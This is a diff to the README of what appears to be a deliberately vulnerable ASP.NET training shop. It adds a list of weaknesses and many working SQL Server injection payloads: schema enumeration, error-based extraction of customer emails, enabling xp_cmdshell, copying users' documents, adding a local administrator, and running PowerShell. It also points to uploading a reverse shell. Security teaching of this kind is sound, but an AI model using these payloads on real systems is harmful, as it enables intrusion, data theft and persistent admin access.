@@ -9,7 +9,38 @@ An admin has left a hint on the login page. See if you can find it in the source
 
 Another way to get in as admin is to create a regular user. Check the Register page source code for hints, and examine what is being posted back to the server. Maybe you can escalate yourself as admin by fiddling with the POST values?
 
+### CSRF
+Antiforgery tokens are enabled in this ASP.NET 5 MVC application.
+
+### Debug mode
+Debug mode in web.config is off.
+
+### Cookies
+HttpOnly cookies are enabled by default in ASP.NET session cookies.
+Sliding cookie expiration is enabled.
+
+### Headers
+ASP.NET suffors from chattiness of headers.
+CSP headers are not enabled.
+
+### SSL
+Https redirection is not enabled
+
+### External javascript libraries
+There are no vulnerable third party libraries
+
+### Brute force login
+Login page does not protect from multiple login attempts with same username/email.
+
+### Directory browsing
+Enabled through web.config.
+
+### Path Traversal
+The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. 
+
+
 ### XSS
+Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance.
 On the front page is a box for user reviews. It seems you can paste almost anything in the textbox!
 
 Things to try https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection:
@@ -33,11 +64,65 @@ Things to try https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XS
 Try if you can inject some code in the search field.
 Here are some examples that might get you started:
     ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
+	x' UNION SELECT 99, @@version, 'http://foo.gif' --
     ' OR 1=1 UNION SELECT 99, system_user, 'http://foo.gif' --
-    ' OR 1=1 UNION SELECT 99, DB_NAME(), 'http://foo.gif' --
-    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases --
-    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' --
-    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') --
+	' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)
+    ' OR 1=1 UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
+    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
+    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
+
+	Error based injection (will dispkay server error)
+	x' AND 1 IN (SELECT @@version) --
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
+
+	If xp_cmdshell is not available try:
+
+	EXEC sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXEC sp_configure 'xp_cmdshell', 1;
+	RECONFIGURE;
+
+	Then try this	
+	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
+	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy';
+
+	Output is not shown as this is a blind injection.
+
+	exec master..xp_cmdshell 'whoami.exe' (current username)
+	exec master..xp_cmdshell 'cd' (print working directory)
+
+	Add administrator
+	exec master..xp_cmdshell 'net user foobar Password123 /add'; -- 
+	exec master..xp_cmdshell 'net localgroups "Administrators" /add'; --
+
+	The above command adds a new local administrator to the remote server. That might help. 
+	Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
+	You can create a table and store the output of a command to it with the following:
+
+	; create table #output (id int identity(1,1), output nvarchar(255) null);
+	; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:';
+	; select * from #output where output is not null order by id;
+
+	Example
+	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
+	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:'; --		
+	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
+	x'; drop table hacker --
+
+	Or combine this with the file upload vulnerability (see next section).
+	
+	This prints the contents of local folder to dir_out.txt file
+	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir/p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+
+	More fun with powershell. See what services are running on the server:
+	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+	
+
+### File Upload
+Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
+reverse shell upload. Seems like anything can be uploaded and directory browsing is enabled.
+
 
 ### Exploitation
 If we can get access to the server it's easy to upload your own shell code and have the website execute it.
